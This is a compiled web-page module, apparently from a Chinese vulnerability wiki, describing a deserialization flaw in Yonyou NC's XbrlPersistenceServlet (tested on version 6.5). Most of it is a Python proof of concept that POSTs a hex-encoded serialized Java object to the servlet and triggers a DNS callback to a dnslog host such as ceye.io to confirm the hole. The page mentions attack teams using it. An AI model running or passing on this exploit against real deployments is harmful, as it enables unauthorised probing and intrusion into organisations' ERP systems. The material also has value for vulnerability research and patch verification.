import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as a,e as x}from"./app-58e4a7d6.js";const e={},t=x(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友 NC XbrlPersistenceServlet反序列化漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>用友NC
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>攻击队利用用友nc反序列利用
目前测试影响版本：nc6<span class="token punctuation">.</span><span class="token number">5</span>
漏洞url为：
<span class="token operator">/</span>service<span class="token operator">/</span><span class="token operator">~</span>xbrl<span class="token operator">/</span>XbrlPersistenceServlet
poc：

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> threadpool
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64

ip <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
dnslog <span class="token operator">=</span> &quot;\\x79\\x37\\x64\\x70\\&quot; <span class="token comment">#dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显</span>
data <span class="token operator">=</span> <span class="token string">&quot;\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11&quot;</span><span class="token operator">+</span>dnslog<span class="token operator">+</span><span class="token string">&quot;\\x3a\\x38\\x30\\x74\\x00\\x00\\x74\\x00\\x0e&quot;</span><span class="token operator">+</span>dnslog<span class="token operator">+</span><span class="token string">&quot;\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f&quot;</span><span class="token operator">+</span>dnslog<span class="token operator">+</span><span class="token string">&quot;\\x3a\\x38\\x30\\x78&quot;</span>

uploadHeader<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;</span><span class="token punctuation">}</span>
req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;http://+&quot;</span>ip<span class="token string">&quot;+/service/~xbrl/XbrlPersistenceServlet&quot;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>uploadHeader<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),o=[t];function p(r,c){return n(),a("div",null,o)}const d=s(e,[["render",p],["__file","用友 NC XbrlPersistenceServlet反序列化.html.vue"]]);export{d as default};
